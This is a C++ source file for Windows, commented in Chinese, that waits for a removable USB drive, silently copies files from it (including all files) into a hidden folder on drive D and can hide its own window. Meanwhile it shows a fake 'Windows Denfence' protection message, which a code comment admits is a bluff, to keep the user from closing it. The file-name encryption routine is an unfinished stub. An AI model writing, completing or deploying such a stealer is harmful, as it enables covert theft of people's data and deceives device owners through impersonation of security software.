#include<iostream>
#include<io.h>
#include<fstream>
#include<random>
#include<ctime>
#include<windows.h>
#include<boost/filesystem.hpp>
using namespace std;
using namespace boost::filesystem;


////////////////      控制台      \\\\\\\\\\\\\\\\\


const char targetExtension[][32]
{
	//要复制的文件的格式
	//全部文件使用: "*.*"
	"*.*",
	".exe",
	".txt",
	".pptx",
	"docx",
	"xlsx",
};

#define RESERVE_DIRECTORY	true			// * 连同目录一起复制
#define LOG_FILE			true			// * 日志文件
#define LF_DESTINATION		""				// * 日志文件输出位置
#define DELAY_TIME			3				//扫描间隔时间(单位:秒)
#define SHOW_CONSOLE		true			//是否显示控制台
#define SHOW_FILES			true			//是否列出文件列表在控制台
#define OVERWRITER			true			//是否覆盖已有文件
#define FILENAME_ENCRYPT	true			// * 是否加密文件名(加密方式:键对值)
#define FNE_MAP_DESTINATION	"D:/1.txt"		//键对值文件位置
#define HIDE_FILE			true			//隐藏被复制的文件
#define DESTINATION			"D:/a/b/c/d/file"	//复制文件的目的地(可设置文件名前缀)
//路径使用"/"分割,而不是"\"

////////////////      控制台      \\\\\\\\\\\\\\\\\


int getRemovableDriver(char(*remDrvList)[4])
{
	char drvString[1024]{};
	int drvTotal = GetLogicalDriveStringsA(1024, drvString) / 4;
	int count = 0;
	for (int i = 0; i < drvTotal; i++)
	{
		if (GetDriveTypeA(drvString + i * 4) == DRIVE_REMOVABLE)
		{
			strcpy_s(remDrvList[count++], 4, drvString + i * 4);
		}
	}
	return count;
}

bool willUseDirectory(const char* path)
{
	char _path[1024]{};
	strcpy_s(_path, 1024, path);
	for (int i = 0; i < 1024; i++)if (_path[i] == (char)'/') _path[i] = (char)'\\';
	if (path[strlen(_path) - 1] != (char)'\\')
	{
		for (int i = strlen(_path) - 1; i > 0; i--)
		{
			if (_path[i - 1] == (char)'\\')
			{
				_path[i] = (char)'\0';
				break;
			}
		}
	}

	if (_access(_path, 0))
	{
		char command[1024] = "mkdir ";
		strcat_s(command, 1024, _path);
		if (system(command))
		{
			return false;
		}
		else return true;
	}
	else return true;
}

bool willUseFile(const char* path)
{
	if (_access(path, 0))
	{
		if (CreateFileA(path, GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr))
		{
			return true;
		}
		else return false;
	}
	else return true;
}

void copyFiles(const char* src)
{
	for (recursive_directory_iterator iter(path(src, native)), end; iter != end; iter++)
	{
		if (!is_directory(*iter))
		{
			for (int i = 0; targetExtension[i][0] != (char)'\0'; i++)
			{
				if (strcmp(iter->path().extension().string().c_str(), targetExtension[i]) == 0)
				{
					char srcFilePath[1024]{};
					strcat_s(srcFilePath, 1024, iter->path().root_path().string().c_str());
					strcat_s(srcFilePath, 1024, iter->path().relative_path().string().c_str());
					char desFilePath[1024]{};
					strcat_s(desFilePath, 1024, DESTINATION);

					//encrypt

					strcat_s(desFilePath, 1024, iter->path().filename().string().c_str());

					bool copySuccess = CopyFileA(srcFilePath, desFilePath, !OVERWRITER);

					if (SHOW_FILES)
					{
						for (int i = 0; i < 1024; i++)if (srcFilePath[i] == (char)'\\')srcFilePath[i] = (char)'/';
						for (int i = 0; i < 1024; i++)if (desFilePath[i] == (char)'\\')desFilePath[i] = (char)'/';
						if (copySuccess)
						{
							if (HIDE_FILE)
							{
								cout << "|SUCCESS ";
							}
							else cout << "|SUCCESS| " << srcFilePath << " -> " << desFilePath << endl;
						}
						else
						{
							if (_access(desFilePath, 0))
							{
								cout << "|FAIL| " << srcFilePath << endl;
							}
							else if (GetFileAttributesA(desFilePath) & FILE_ATTRIBUTE_HIDDEN)
							{
								cout << "文件已存在，是隐藏文件" << endl;
							}
							else
							{
								cout << "error" << endl;
							}
						}
					}

					//此处存在一个bug，开启隐藏文件且复制失败会导致输出 "(HIDDEN)| "。。。。

					if (HIDE_FILE)
					{
						if (SetFileAttributesA(desFilePath, FILE_ATTRIBUTE_HIDDEN) && SHOW_FILES)
							cout << "(HIDDEN)| " << srcFilePath << " -> " << desFilePath << endl;
					}

					break;
				}
			}
		}
	}
}

void fileNameEncrypt(char* fileName, ofstream* outputFile)
{
	char oldFileName[1024]{}, ciphertext[1024]{};
	strcpy_s(oldFileName, 1024, fileName);

	char optinalChar[1024]{};



	for (int i = 0; i < 128; i++)
	{

	}

	srand(time(nullptr));
	int random = rand();






	char writeString[1024]{};
	strcat_s(writeString, 1024, ciphertext);
	strcat_s(writeString, 1024, "\t");
	strcat_s(writeString, 1024, oldFileName);
	strcat_s(writeString, 1024, "\n");



	outputFile->open(fileName);
	outputFile->write(writeString, 1024);



}

int main()
{
	if (!(willUseDirectory(DESTINATION) && willUseFile(FNE_MAP_DESTINATION)))
	{
		cout << "必须文件创建失败" << endl;
		exit(114514);
	}

	HWND hwnd = GetForegroundWindow();
	if (SHOW_CONSOLE)
	{
		ShowWindow(hwnd, SW_SHOW);
	}
	else
	{
		ShowWindow(hwnd, SW_HIDE);
	}


again:

	//while (true)
	//{
	char remDrvList[32][4]{};
	int remDrvCount = 0;


	do
	{
		remDrvCount = getRemovableDriver(remDrvList);
		time_t t = time(nullptr);
		char strTime[128]{};
		ctime_s(strTime, 128, &t);
		strTime[strlen(strTime) - 1] = (char)'\0';
		//扯鬼
		cout << "[" << strTime << "] Windows Denfence 正在保护你的电脑,请不要关闭该窗口" << endl;
		Sleep(3 * 1000);
	} while (remDrvCount == 0);

	for (int i = 0; i < remDrvCount; i++)
	{
		try
		{
			copyFiles(remDrvList[i]);
		}
		catch (filesystem_error e)
		{
			cerr << e.what() << endl;
			goto again;
		}
	}
	//}
}